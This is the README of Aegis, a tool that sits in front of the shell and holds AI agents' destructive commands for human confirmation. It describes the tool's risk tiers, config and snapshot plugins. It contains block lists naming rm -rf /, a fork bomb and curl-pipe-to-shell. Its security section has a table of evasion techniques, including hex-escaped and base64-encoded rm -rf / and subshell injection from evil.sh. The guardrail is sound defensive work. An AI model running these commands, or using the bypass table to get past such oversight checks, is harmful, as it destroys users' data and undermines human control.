# Aegis

> A terminal proxy that intercepts AI agent shell commands and requires human confirmation before destructive operations.

[![CI](https://github.com/IliasAlmerekov/aegis/actions/workflows/ci.yml/badge.svg)](https://github.com/IliasAlmerekov/aegis/actions/workflows/ci.yml)
[![Crates.io](https://img.shields.io/crates/v/aegis.svg)](https://crates.io/crates/aegis)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos-lightgrey)](#install)

---

## Why Aegis exists

AI coding agents are fast and capable. They are also capable of destroying production data in seconds.

**Replit, 2024.** A developer gave an AI agent access to their production environment. The agent, attempting to "clean up" a failed migration, ran `prisma migrate reset --force` against the live database. Every row in every table was gone. Backups had not been tested. Recovery took three days.

**DataTalks.Club, 2024.** During a live course session, an AI agent helping with infrastructure setup executed `terraform destroy` to "start fresh" after encountering a configuration error. The entire workshop environment — EC2 instances, RDS databases, S3 buckets — was torn down in under two minutes.

**Prisma community, 2024.** A widely-shared incident: an AI agent ran `git filter-branch` to remove a secret accidentally committed to a shared repository. The rewrite corrupted the remote history across fourteen forks. The team spent a week recovering contributor branches.

These are not edge cases. Every agent that can run shell commands can run destructive shell commands. Aegis puts a human back in the loop — with zero friction for safe commands and a mandatory confirmation gate for everything else.

---

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/IliasAlmerekov/aegis/main/scripts/install.sh | sh
```

The installer detects your platform (`linux`/`macos`, `x86_64`/`aarch64`), downloads the matching pre-built binary from GitHub Releases, and installs it to `/usr/local/bin/aegis`.

Or install from source with Cargo:

```bash
cargo install aegis
```

---

## Demo

<!-- demo GIF goes here — record with: vhs demo.tape or asciinema rec -->
<!-- Scenario: agent runs `terraform destroy` → Aegis intercepts → user sees dialog → denies -->

*Demo GIF coming soon. To preview locally: `aegis -c 'terraform destroy'`*

---

## Quick Start

Five steps from zero to your first interception.

**1. Install Aegis**

```bash
curl -fsSL https://raw.githubusercontent.com/IliasAlmerekov/aegis/main/scripts/install.sh | sh
```

**2. Register Aegis as your shell**

```bash
# bash
echo 'export SHELL=$(which aegis)' >> ~/.bashrc && source ~/.bashrc

# zsh
echo 'export SHELL=$(which aegis)' >> ~/.zshrc && source ~/.zshrc
```

**3. Configure Claude Code (if you use it)**

Open Claude Code settings → set the shell path to the output of `which aegis`.

**4. Verify interception works**

```bash
aegis -c 'rm -rf /tmp/aegis-test'
```

You should see the Aegis confirmation dialog. Type `n` and press Enter to deny.

**5. Run your first safe command**

```bash
aegis -c 'echo hello'
# → hello (passes through instantly, no dialog)
```

Safe commands have less than 2ms overhead. Aegis only interrupts you when it matters.

---

## How it works

Aegis is set as your `$SHELL`. When any program (Claude Code, Codex CLI, a script, your terminal) invokes a shell command, Aegis receives it first.

```
AI agent → $SHELL → Aegis → assess(cmd)
                               ├── Safe   → exec immediately (< 2ms)
                               ├── Warn   → show dialog, default = Yes
                               ├── Danger → snapshot + show dialog, default = No
                               └── Block  → print reason, exit 1 (no dialog)
```

Before showing the dialog for `Danger` commands, Aegis creates a snapshot (git stash, Docker commit) so you can roll back even if you accidentally approve.

All decisions — approved, denied, blocked — are written to `~/.aegis/audit.jsonl`.

---

## Security model

### What Aegis is

Aegis is a **heuristic command guardrail**. It classifies shell commands by pattern matching and requires human confirmation before running anything that looks destructive. That's the full extent of its security guarantee.

It is **not a sandbox**. After you approve a command, it runs with your full user permissions — Aegis imposes no namespace isolation, no capability restrictions, no filesystem filtering at the kernel level.

It is **not a complete security boundary**. A sufficiently motivated agent (or a bug in your patterns) can send a command that Aegis does not intercept.

### What Aegis protects against

- An AI agent that directly issues a recognisably destructive command (`rm -rf`, `terraform destroy`, `DROP TABLE`, etc.)
- A developer who fat-fingers a dangerous command and wants a confirmation prompt

Aegis is most effective when the commands it needs to catch are literal and unobfuscated — the common case for AI agents operating honestly.

### Explicit non-goals

The following bypass vectors are **out of scope by design**. Aegis makes no claim to stop them:

| Bypass | Example | Why out of scope |
|--------|---------|-----------------|
| Obfuscated shell | `$'\x72\x6d\x20\x2d\x72\x66\x20\x2f'` | Expanding all shell escapes is a full shell interpreter |
| Indirect execution | Write `nuke.sh` to disk, then `bash nuke.sh` | The write itself may be safe; the danger is deferred |
| Script-generated commands | `eval "$(some_fn)"` where `some_fn` returns `rm -rf /` | Runtime assembly is invisible at intercept time |
| Alias / function expansion | `alias ls='rm -rf /'` then `ls` | Aliases are shell state, not visible in the raw command string |
| Encoded payloads | `echo cm0gLXJmIC8= | base64 -d | bash` | `PKG-004` catches the `eval`/pipe form; arbitrary encodings are not enumerated |
| Subshell injection | `cargo build; $(curl evil.sh)` | The injected subshell may arrive as part of an otherwise safe command |

### Threat model summary

Aegis raises the bar against **accidental and well-intentioned-but-mistaken** destructive commands from AI agents and humans. It is not designed to stop an adversarially-controlled agent that is actively trying to evade detection.

For stronger guarantees, pair Aegis with OS-level controls: run your agent in a container, a VM, or under a restricted user account with no write access to production resources.

---

## aegis.toml reference

Aegis searches for config in this order:
1. `.aegis.toml` in the current directory (project-level)
2. `~/.config/aegis/config.toml` (global)
3. Built-in defaults (works without any config file)

Generate a starter config:

```bash
aegis config init      # writes .aegis.toml in the current directory
aegis config show      # prints the active config (merged from all sources)
```

### Full reference

```toml
# Operating mode.
#   Protect  — prompt on Warn/Danger, block on Block (default)
#   Audit    — log everything but never block or prompt
#   Strict   — same as Protect but with tighter defaults (future)
mode = "Protect"

# Create a git stash snapshot before Danger commands when a .git directory exists.
auto_snapshot_git = true

# Commit running containers before Danger commands when Docker is available.
auto_snapshot_docker = true

# Commands matching these glob patterns are trusted and bypass the dialog.
# They are still logged to the audit file.
allowlist = [
    # "terraform destroy -target=module.test.*",
    # "docker system prune --volumes",
]

# Extra patterns loaded on top of the built-in set.
# Fields: id, category, risk, pattern (regex), description, safe_alt (optional).
custom_patterns = [
    # { id = "USR-001", category = "Cloud", risk = "Danger",
    #   pattern = "my-destroy-script\\.sh",
    #   description = "Internal teardown script — always requires approval",
    #   safe_alt = "my-destroy-script.sh --dry-run" },
]
```

### Mode quick-reference

| Mode | Warn | Danger | Block |
|------|------|--------|-------|
| `Protect` | dialog (default Yes) | snapshot + dialog (default No) | immediate exit 1 |
| `Audit` | log only | log only | log only |
| `Strict` | dialog (default No) | snapshot + dialog (default No) | immediate exit 1 |

---

## Pattern reference

Aegis ships with 55 built-in patterns across 7 categories. Every pattern has an ID, a risk level, a description, and (where applicable) a safer alternative.

### Risk levels

| Level | Meaning | Default action |
|-------|---------|----------------|
| `Safe` | No match — passes through instantly | — |
| `Warn` | Potentially destructive but common | Dialog, default Yes |
| `Danger` | High likelihood of data loss | Snapshot + dialog, default No |
| `Block` | Catastrophic — no safe version | Immediate exit 1 |

---

### Filesystem

| ID | Pattern | Risk | Description | Safe alternative |
|----|---------|------|-------------|-----------------|
| FS-001 | `rm -rf` / `rm -fr` | Danger | Recursive force delete — no recovery path | `trash <path>` or `mv <path> /tmp/backup-$(date +%s)` |
| FS-002 | `find ... -delete` / `-exec rm` | Danger | Silent bulk delete of matched file tree | Dry-run: `find <args>` without `-delete` |
| FS-003 | `dd of=/dev/sdX` | Danger | Writes to a raw block device | Use a temp file target for testing |
| FS-004 | `shred` | Danger | Irrecoverable file overwrite | `trash <file>` if secure erase is not needed |
| FS-005 | `truncate -s 0` | Warn | Empties file content | Back up first: `cp <file> <file>.bak` |
| FS-006 | `mkfs.*` | Block | Formats a filesystem — destroys all data on the device | Verify target with `lsblk` before formatting |
| FS-007 | `chmod ...7XX` | Warn | World-writable bits on files or directories | Apply minimum required permissions |
| FS-008 | `chown -R` | Warn | Recursive ownership change | Confirm the target path is correct |
| FS-009 | `> /dev/sdX` | Block | Redirect to raw block device | Use a file path, not a raw device |
| FS-010 | `mv .*/etc` | Danger | Moves `/etc` — can make system unbootable | Copy and modify under `/etc` instead |

### Git

| ID | Pattern | Risk | Description | Safe alternative |
|----|---------|------|-------------|-----------------|
| GIT-001 | `git reset --hard` | Warn | Discards all uncommitted changes | `git stash push -m "backup"` first |
| GIT-002 | `git clean -f` | Warn | Removes untracked files permanently | `git clean -n` (dry-run) first |
| GIT-003 | `git push --force` | Warn | Rewrites remote history | Prefer `--force-with-lease` |
| GIT-004 | `git filter-branch` | Danger | Rewrites entire repository history | Use `git filter-repo` and coordinate with contributors |
| GIT-005 | `git rebase` | Warn | Rewrites commit history | Create a backup branch before rebasing |
| GIT-006 | `git branch -D` | Warn | Force-deletes branch with unmerged commits | Check `git branch --merged` first |
| GIT-007 | `git checkout -- .` | Warn | Discards all unstaged changes | Stage or stash changes you want to keep |
| GIT-008 | `git stash drop/clear` | Warn | Permanently removes stash entries | Apply stash before dropping |

### Database

| ID | Pattern | Risk | Description | Safe alternative |
|----|---------|------|-------------|-----------------|
| DB-001 | `DROP TABLE` | Danger | Deletes a table and all its data | `CREATE TABLE backup AS SELECT * FROM <table>` |
| DB-002 | `DROP DATABASE` | Danger | Destroys an entire database | `pg_dump` / `mysqldump` before dropping |
| DB-003 | `DELETE FROM` without WHERE | Danger | Deletes every row in the table | Always add a WHERE clause; test with SELECT |
| DB-004 | `TRUNCATE TABLE` | Danger | Removes all rows instantly | DELETE with WHERE or take a backup first |
| DB-005 | `--accept-data-loss` | Danger | Explicitly acknowledges potential data loss | Investigate why the flag is needed |
| DB-006 | `FLUSHALL` / `FLUSHDB` | Danger | Wipes all Redis keys | Use `SCAN + DEL` for targeted key removal |
| DB-007 | `DROP SCHEMA` | Danger | Deletes entire schema and all contained objects | Back up schema first |
| DB-008 | `ALTER TABLE ... DROP COLUMN` | Warn | Removes a column and all its data | Migrate dependent queries before dropping |

### Cloud

| ID | Pattern | Risk | Description | Safe alternative |
|----|---------|------|-------------|-----------------|
| CL-001 | `terraform destroy` | Danger | Tears down all infrastructure in the Terraform state | `terraform plan -destroy` first |
| CL-002 | `aws ec2 terminate-instances` | Danger | Permanently terminates EC2 instances | `aws ec2 stop-instances` to preserve data |
| CL-003 | `kubectl delete` | Warn | Removes Kubernetes resources (PVCs may delete storage) | `--dry-run=client` first |
| CL-004 | `pulumi destroy` | Danger | Destroys all Pulumi stack resources | `pulumi preview --diff` first |
| CL-005 | `aws s3 rm --recursive` | Danger | Recursively deletes all S3 objects under a prefix | `aws s3 ls <path>` and enable versioning |
| CL-006 | `aws rds delete-db-instance` | Danger | Permanently deletes an RDS instance | Enable deletion protection; take a final snapshot |
| CL-007 | `gcloud compute instances delete` | Danger | Permanently deletes GCP VM instances | Snapshot the boot disk before deletion |
| CL-008 | `az vm delete` | Danger | Permanently deletes an Azure VM | `az vm deallocate` and capture image first |
| CL-009 | `aws iam delete-(role\|policy\|user\|group)` | Warn | Removes IAM identity — can break dependent services | Detach all policies and verify no services depend on it |
| CL-010 | `kubectl delete namespace` | Danger | Deletes namespace and every resource inside | `kubectl get all -n <ns>` first |

### Docker

| ID | Pattern | Risk | Description | Safe alternative |
|----|---------|------|-------------|-----------------|
| DK-001 | `docker system prune` | Warn | Removes stopped containers, images, networks, build cache | `--filter until=24h` to limit to older resources |
| DK-002 | `docker volume prune` | Warn | Removes all unused volumes including persistent data | `docker volume ls` and back up data first |
| DK-003 | `docker-compose down -v` | Warn | Stops services and removes named volumes | Omit `-v` to keep volume data |
| DK-004 | `docker rmi` | Warn | Removes Docker images | Tag images you want to keep before bulk rmi |
| DK-005 | `docker container prune` | Warn | Removes all stopped containers including logs | `docker ps -a` before pruning |
| DK-006 | `docker network prune` | Warn | Removes unused networks — can break reconnecting containers | `docker network ls` before pruning |

### Process

| ID | Pattern | Risk | Description | Safe alternative |
|----|---------|------|-------------|-----------------|
| PS-001 | `kill -9 1` | Block | SIGKILL to PID 1 (init/systemd) — crashes the entire system | `systemctl stop <service>` |
| PS-002 | `pkill -9` | Warn | SIGKILL to all matching processes — no graceful shutdown | `pkill -15` (SIGTERM) first |
| PS-003 | `killall` | Warn | Kills all processes by name — can terminate critical daemons | `kill <specific-pid>` after `pgrep <name>` |
| PS-004 | `:(){ :|:& };:` | Block | Fork bomb — exhausts process table | No safe version — must not be run |
| PS-005 | `chmod 777 /` | Danger | World-writable root filesystem — severe security vulnerability | Apply permissions only to the specific directory |
| PS-006 | `rm -rf /` | Block | Deletes the entire root filesystem | No safe alternative — must not be run |
| PS-007 | `umount /` | Block | Unmounts the root filesystem — immediate system crash | `umount <specific-mountpoint>` |

### Package

| ID | Pattern | Risk | Description | Safe alternative |
|----|---------|------|-------------|-----------------|
| PKG-001 | `curl ... \| sh` | Danger | Executes a remote script without integrity verification | Download first, inspect, then run |
| PKG-002 | `wget ... \| sh` | Danger | Same as above via wget | Download first, inspect, then run |
| PKG-003 | `bash <(curl ...)` | Danger | Process substitution downloads and executes remote code | Download the script first, review, then execute |
| PKG-004 | `eval $(curl/wget ...)` | Danger | Evaluates remote download as shell code | Never eval untrusted remote content |
| PKG-005 | `pip install --trusted-host` | Warn | Disables SSL verification | Fix the TLS issue instead of bypassing |

---

## Adding custom patterns

Add your own patterns in `aegis.toml` or `.aegis.toml`:

```toml
[[custom_patterns]]
id          = "USR-001"
category    = "Cloud"
risk        = "Danger"
pattern     = "my-nuke-script\\.sh"
description = "Internal teardown script — requires explicit approval"
safe_alt    = "my-nuke-script.sh --dry-run"
```

Patterns are [Rust regex](https://docs.rs/regex/latest/regex/) strings. They are matched case-sensitively by default; use `(?i)` for case-insensitive matching.

The `allowlist` field accepts glob patterns:

```toml
allowlist = [
    "terraform destroy -target=module.staging.*",
]
```

Allowlisted commands are still logged to the audit file.

---

## Plugin architecture

Aegis's snapshot system is plugin-based. Each plugin implements the `SnapshotPlugin` trait:

```rust
use std::path::Path;
use async_trait::async_trait;
use aegis::error::AegisError;

pub struct MyPlugin;

#[async_trait]
impl aegis::snapshot::SnapshotPlugin for MyPlugin {
    fn name(&self) -> &'static str {
        "my-plugin"
    }

    /// Return true when this plugin can act on the given working directory.
    fn is_applicable(&self, cwd: &Path) -> bool {
        cwd.join(".my-project-marker").exists()
    }

    /// Create a snapshot and return its identifier for future rollback.
    async fn snapshot(&self, cwd: &Path, cmd: &str) -> Result<String, AegisError> {
        // e.g. call an external backup CLI, return the snapshot ID
        Ok("snap-2024-01-01T00:00:00Z".to_string())
    }

    /// Revert to the snapshot identified by `snapshot_id`.
    async fn rollback(&self, snapshot_id: &str) -> Result<(), AegisError> {
        // e.g. restore from the given snapshot ID
        Ok(())
    }
}
```

**Key rules:**
- `is_applicable` is called on every command — keep it cheap (filesystem check only).
- `snapshot` is only called for `Danger`-level commands, before the dialog.
- A plugin failure is logged as a warning and does not abort other plugins.
- All async methods require `#[async_trait]` — `async fn` is not object-safe in Rust without it.

**Built-in plugins:**

| Plugin | Trigger | Snapshot mechanism | Rollback |
|--------|---------|-------------------|---------|
| `GitPlugin` | `.git/` exists in `cwd` | `git stash push --include-untracked` | `git stash pop --index <ref>` |
| `DockerPlugin` | Docker CLI available + containers running | `docker commit <container>` | `docker run` from saved image |

---

## Audit log

Every interception — approved, denied, blocked, or auto-approved — is appended to `~/.aegis/audit.jsonl` as a single JSON object.

```bash
aegis audit --last 20           # show last 20 entries
aegis audit --risk Danger       # filter by risk level
```

Example entry:

```json
{
  "timestamp": "2024-11-14T09:23:41Z",
  "command": "terraform destroy -auto-approve",
  "risk": "Danger",
  "matched_patterns": ["CL-001"],
  "decision": "Denied",
  "snapshots": [{"plugin": "git", "snapshot_id": "stash@{0}"}]
}
```

---

## Performance

The fast path (safe commands) is under 2ms:

1. **Aho-Corasick first pass** — keyword scan, no allocations. If nothing matches, return `Safe` immediately.
2. **Regex full scan** — only reached for commands that contain a suspicious keyword.
3. Regex patterns are compiled once at startup via `std::sync::LazyLock` and reused.

Benchmarks (`cargo bench`):

| Scenario | Throughput |
|----------|-----------|
| Safe command (fast path) | > 500,000 ops/sec |
| Danger command (full scan) | > 50,000 ops/sec |

---

## Contributing

Bug reports and pull requests are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).

Please open an issue before starting large changes — especially new pattern categories or snapshot backends.

---

## License

MIT — see [LICENSE](LICENSE).
